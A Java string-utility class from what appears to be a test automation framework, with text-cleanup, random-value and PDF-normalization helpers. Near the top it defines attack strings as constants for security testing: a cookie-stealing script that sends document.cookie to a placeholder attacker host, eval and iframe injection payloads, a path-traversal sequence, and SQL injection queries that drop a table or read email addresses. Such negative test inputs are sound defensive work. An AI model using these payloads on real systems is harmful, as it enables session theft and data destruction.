package com.tsys.testcommon.framework.utils.string;

import java.security.SecureRandom;
import java.util.List;
import java.util.UUID;
import java.util.regex.Pattern;

import org.apache.commons.lang.StringEscapeUtils;

public class StringUtil {

    public static final String SPACE = " ";
    public static final String APOSTROPHE = "'";
    public static final String FORWARD_SLASH = "/";
    public static final String DOT = ".";
    public static final String ENCODED_SPACE = "%20";
    public static final String ENCODED_DOUBLE_QUOTE = "%22";
    public static final String PERCENTAGE_S = "%s";
    public static final String AND = "&";
    public static final String AND_WORD = "and";
    public static final String EQUALS = "=";
    public static final String SCRIPT_TAG = StringEscapeUtils.escapeHtml("<script>window.location=\"https://some_attacker/evilcgi/cookie.cgi?steal=\" + escape(document.cookie)</script>");
    public static final String EVAL_TAG = "eval(doSomething.toString().replace(/}\\s*$/, ' return id; $&'));";
    public static final String IFRAME_TAG = "<iframe src=”javascript:alert(1)>";
    public static final String NULL_CHARACTER = "\0";
    public static final String NEW_LINE_CHARACTER = "\n";
    public static final String CARRIAGE_RETURN_CHARACTER = "\r";
    public static final String BACKSPACE_CHARACTER = "\b";
    public static final String TAB_CHARACTER = "\t";
    public static final String PATH_TRAVERSAL_CHARACTER = "../";
    public static final String DROP_TABLE_QUERY =
            "SELECT * FROM serviceprovider.serviceprovider; DROP TABLE serviceprovider.serviceprovider";
    public static final String DATA_RETRIEVAL_QUERY =
            "SELECT * FROM contact.email";
    private static final Pattern pattern = Pattern.compile("([^,]+)");

    // --- REGEX PATTERNS ---

    private static final Pattern WHITESPACE_NORMALIZATION = Pattern.compile("\\s+");
    private static final Pattern UUID_SPLIT_FIX =
            Pattern.compile("(?i)([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4})\\s+([0-9a-f]{12})");
    private static final Pattern LONG_CHUNK_SPLIT = Pattern.compile("([A-Za-z0-9]{15,})\\s+([A-Za-z0-9]{10,})");
    private static final Pattern SPACE_BEFORE_AT = Pattern.compile("\\s+@");
    private static final Pattern LIGATURE_FB_DROP = Pattern.compile("([A-Za-z0-9]{6,})fb([A-Za-z0-9]{6,})");


    public static String removeDots(String str) {
        return str.replaceAll("\\.", "");
    }

    public static String removeLastChar(String str) {
        return str.substring(0, str.length() - 1);

    }

    public static String removeColons(String str) {
        return str.replaceAll("\\:", "");
    }

    public static String removeWhiteSpaces(String str) {
        return str.replaceAll("\\s+", "");
    }

    public static String generateStrongPassword(Integer length) {
        return "!".concat(generateWeakPassword(length));
    }

    public static String generateWeakPassword(Integer length) {
        return org.apache.commons.lang3.RandomStringUtils.randomAlphanumeric(length);
    }

    public static String removePlus(String str) {
        return str.replaceAll("\\+", "");
    }

    public static String replaceNewLineWithSpace(String str) {
        return str.replace('\n', ' ');
    }

    public static String[] splitOnWhitespace(String str) {
        return str.split("\\s+");
    }

    public static String[] splitOnDot(String str) {
        return str.split("\\.");
    }

    public static String capitalizeWords(String str) {
        String[] words = str.split("\\s");
        StringBuilder capitalizedWords = new StringBuilder();
        for (String w : words) {
            String first = w.substring(0, 1);
            String afterFirst = w.substring(1);
            capitalizedWords.append(first.toUpperCase())
                    .append(afterFirst)
                    .append(' ');
        }
        return capitalizedWords.toString().trim();
    }

    public static String getRandomUuid() {
        return UUID.randomUUID().toString();
    }

    public static String removeSquareBrackets(String value) {
        return value.replace("[", "").replace("]", "");
    }


    public static String joinWithPrefix(List<String> value, String prefix) {
        value.replaceAll(s -> prefix + s);
        return String.join(",", value);
    }

    public static String wrapQuotes(String value) {
        return pattern.matcher(value).replaceAll("'$1'");
    }

    public static String generateRandomNumber(int n) {
        if (n <= 0) {
            throw new IllegalArgumentException("Digit count must be > 0");
        }

        SecureRandom random = new SecureRandom();  // Safer than Random
        StringBuilder sb = new StringBuilder();

        sb.append(random.nextInt(9) + 1); // 1-9 first digit
        for (int i = 1; i < n; i++) {
            sb.append(random.nextInt(10)); // 0-9 remaining
        }
        return sb.toString();
    }

    public static String insertCharBeforeAtInTheEmail(String charToBeAdded, String email) {
        if (email == null || !email.contains("@")) {
            throw new IllegalArgumentException("Invalid email address.");
        }

        int atIndex = email.indexOf("@");
        return email.substring(0, atIndex) + charToBeAdded + email.substring(atIndex);
    }

    public static String transformSpName(String multipartSpName) {
        if (multipartSpName == null || multipartSpName.isEmpty()) return "";
        String[] parts = multipartSpName.split("-");
        StringBuilder capitalized = new StringBuilder();
        for (String part : parts) {
            if (!part.isEmpty()) {
                capitalized.append(capitalizeFirst(part)).append(" ");
            }
        }
        return capitalized.toString().trim();
    }

    private static String capitalizeFirst(String input) {
        if (input == null || input.isEmpty()) return input;
        return input.substring(0, 1).toUpperCase() + input.substring(1);
    }

    public static String normalizeSpaces(String s) {
        // collapse NBSP and multiple spaces to single ASCII space
        return s.replace('\u00A0', ' ').replaceAll("\\s+", " ").trim();
    }

    public static String normalizePdfForComparison(String text) {
        if (text == null) {
            return "";
        }

        // 1) normalize whitespace
        String s = text.replace("\r", " ").replace("\n", " ");
        s = WHITESPACE_NORMALIZATION.matcher(s).replaceAll(" ").trim();

        // 2) fix UUIDs split before the last 12 hex chars
        s = UUID_SPLIT_FIX.matcher(s).replaceAll("$1$2");

        // 3) join long alphanumeric chunks that were split once
        s = LONG_CHUNK_SPLIT.matcher(s).replaceAll("$1$2");

        // 4) remove accidental spaces before '@'
        s = SPACE_BEFORE_AT.matcher(s).replaceAll("@");

        // 5) handle "fb" ligature drops
        s = LIGATURE_FB_DROP.matcher(s).replaceAll("$1$2");

        return s;
    }

}